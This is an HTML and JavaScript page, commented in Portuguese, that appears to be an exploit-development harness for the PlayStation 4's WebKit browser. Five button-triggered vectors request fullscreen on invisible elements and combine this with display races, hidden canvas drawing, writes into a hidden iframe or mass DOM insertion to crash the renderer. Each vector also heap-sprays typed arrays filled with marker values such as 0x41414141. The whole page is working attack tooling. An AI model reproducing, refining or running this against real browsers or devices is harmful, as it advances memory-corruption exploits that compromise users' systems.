<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v580000: The Invisible Man</title>
<style>
    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #0f0; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #003; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #002; color: #fff; border: 2px solid #0f0;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #0f0; color: #000; }
    
    #stage { background: #111; height: 100px; border: 1px solid #555; margin-top: 20px; }
    
    /* O elemento invisível */
    .ghost { display: none; width: 100px; height: 100px; background: red; }
</style>
</head>
<body>

<h1>v580000: THE INVISIBLE MAN</h1>

<div class="status" id="msg">
    ALVO: FULLSCREEN EM ELEMENTOS 'DISPLAY: NONE'<br>
    CLIQUE -> ALERTA (OK) -> CRASH
</div>

<button onclick="invisible(i01)">01. Zero-Size Texture Stretch</button>

<button onclick="invisible(i02)">02. Display Toggle Race</button>

<button onclick="invisible(i03)">03. Hidden Video/Canvas Force</button>

<button onclick="invisible(i04)">04. Hidden Iframe Crash</button>

<button onclick="invisible(i05)">05. Hidden DOM Mutation</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // Spray Global
    let spray = [];
    const pattern = new Uint32Array(1024).fill(0x41414141);

    function invisible(vectorFunc) {
        Stage.innerHTML = "";
        spray = [];
        
        // 1. Configura
        const element = vectorFunc(Stage);
        
        // 2. Dispara lógica (com delay para setup)
        setTimeout(() => {
            if(element.trigger) element.trigger();
        }, 50);
    }

    // =================================================================
    // 01. Zero-Size Texture Stretch
    // Tenta fullscreen num elemento vazio e invisível.
    // A GPU tenta escalar 0px para 1920px (Divisão por zero ou textura inválida).
    // =================================================================
    function i01(stage) {
        const d = document.createElement('div');
        d.className = 'ghost'; // display: none
        d.innerText = "ALVO ZERO";
        stage.appendChild(d);

        d.trigger = () => {
            window.alert("⚠️ ZERO GEOMETRY ⚠️\nAo clicar OK: Fullscreen em elemento invisível.");
            
            // 1. Fullscreen no elemento invisível
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            else if (d.requestFullscreen) d.requestFullscreen();
            
            // 2. Tenta forçar cálculo de estilo imediatamente
            // O navegador pode travar tentando calcular o tamanho de algo que não existe
            const width = d.offsetWidth; 
            
            // 3. Spray
            for(let i=0; i<1000; i++) spray.push(new Float64Array(100).fill(1.1));
        };
        return d;
    }

    // =================================================================
    // 02. Display Toggle Race
    // Pede Fullscreen no invisível, mas IMEDIATAMENTE torna ele visível e invisível de novo.
    // Confunde a Thread de Pintura (Compositor).
    // =================================================================
    function i02(stage) {
        const d = document.createElement('div');
        d.className = 'ghost';
        d.style.background = "blue";
        stage.appendChild(d);

        d.trigger = () => {
            window.alert("⚠️ TOGGLE RACE ⚠️\nAo clicar OK: Piscar Visibilidade durante transição.");
            
            // 1. Fullscreen
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            else if (d.requestFullscreen) d.requestFullscreen();
            
            // 2. Loop de troca de estado (Race Condition)
            // Tenta trocar o estado visual ENQUANTO a animação de fullscreen acontece
            for(let i=0; i<100; i++) {
                d.style.display = "block";
                d.style.display = "none";
            }
            // Termina em none
            d.style.display = "none";
        };
        return d;
    }

    // =================================================================
    // 03. Hidden Video/Canvas Force
    // Coloca um Canvas (GPU) dentro do div invisível.
    // Pede fullscreen no DIV invisível.
    // O navegador tem que inicializar o contexto gráfico de algo oculto.
    // =================================================================
    function i03(stage) {
        const d = document.createElement('div');
        d.className = 'ghost';
        
        const c = document.createElement('canvas');
        c.width = 500; c.height = 500;
        const ctx = c.getContext('2d');
        ctx.fillStyle = 'red'; ctx.fillRect(0,0,500,500);
        
        d.appendChild(c);
        stage.appendChild(d);

        d.trigger = () => {
            window.alert("⚠️ HIDDEN GPU CONTEXT ⚠️\nAo clicar OK: Fullscreen em Canvas Oculto.");
            
            // Fullscreen no PAI invisível
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            else if (d.requestFullscreen) d.requestFullscreen();
            
            // Tenta desenhar no canvas enquanto ele está sendo esticado invisivelmente
            setInterval(() => {
                ctx.fillRect(Math.random()*500, 0, 50, 50);
            }, 10);
        };
        return d;
    }

    // =================================================================
    // 04. Hidden Iframe Crash
    // Iframes dentro de elementos display:none muitas vezes não têm
    // o objeto 'window' inicializado corretamente.
    // =================================================================
    function i04(stage) {
        const d = document.createElement('div');
        d.className = 'ghost';
        
        const ifr = document.createElement('iframe');
        d.appendChild(ifr);
        stage.appendChild(d);

        d.trigger = () => {
            window.alert("⚠️ BLIND IFRAME ⚠️\nAo clicar OK: Acessar Window de Iframe Oculto.");
            
            // 1. Fullscreen no Pai Oculto
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            
            // 2. Tentar escrever no documento do iframe
            // Em WebKits antigos, isso falha se o iframe não foi renderizado
            try {
                ifr.contentDocument.write("<h1>CRASH</h1>");
                ifr.contentDocument.close();
            } catch(e) {}
            
            // Spray
            spray.push(new Uint32Array(5000).fill(0xDEADBEEF));
        };
        return d;
    }

    // =================================================================
    // 05. Hidden DOM Mutation
    // Pede fullscreen no elemento invisível e ADICIONA milhares de filhos
    // a ele no mesmo milissegundo. O layout engine tem que calcular tamanho 0 para todos.
    // =================================================================
    function i05(stage) {
        const d = document.createElement('div');
        d.className = 'ghost';
        stage.appendChild(d);

        d.trigger = () => {
            window.alert("⚠️ HIDDEN MUTATION ⚠️\nAo clicar OK: Explosão de elementos ocultos.");
            
            // 1. Fullscreen
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            
            // 2. Injeta 2000 elementos dentro do alvo invisível
            // Isso força o navegador a criar render objects que não serão pintados
            const frag = document.createDocumentFragment();
            for(let i=0; i<2000; i++) {
                const s = document.createElement('span');
                s.innerText = "A";
                frag.appendChild(s);
            }
            d.appendChild(frag);
            
            // Spray
            for(let i=0; i<1000; i++) spray.push(new Uint32Array(pattern));
        };
        return d;
    }

</script>
</body>
</html>
